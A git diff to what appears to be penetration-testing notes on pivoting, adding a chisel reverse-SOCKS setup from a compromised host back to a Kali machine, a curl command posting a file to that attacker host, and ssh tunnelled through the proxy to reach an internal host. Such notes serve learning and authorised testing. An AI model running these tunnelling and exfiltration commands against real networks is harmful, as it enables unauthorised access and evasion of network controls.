@@ -67,6 +67,21 @@ socat TCP-LISTEN:2222,fork TCP:host_c:22
 >
 > on localhost, access to port 3rd:<br>
 >	`curl http://localhost:port(localhost)`
+- C:
+//Assuming, the compromised host_b only port 80 is available, use chisel to proxy all traffic through this port, this case , lets ssh to host_c
+
+```
+kali@kali:~$ chisel server --port 8080 --reverse
+
+//in host_b,compromised; connect server and output all into the server port
+
+chisel client kali_IP:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://kali:8080/
+
+//use ncat to force traffic, and the proxy will go port 1080 not 8080, if you use 'ss', you will see it listening
+
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' host_c  user@host_c
+```
+
 
 ### For Win
 ##### SSH
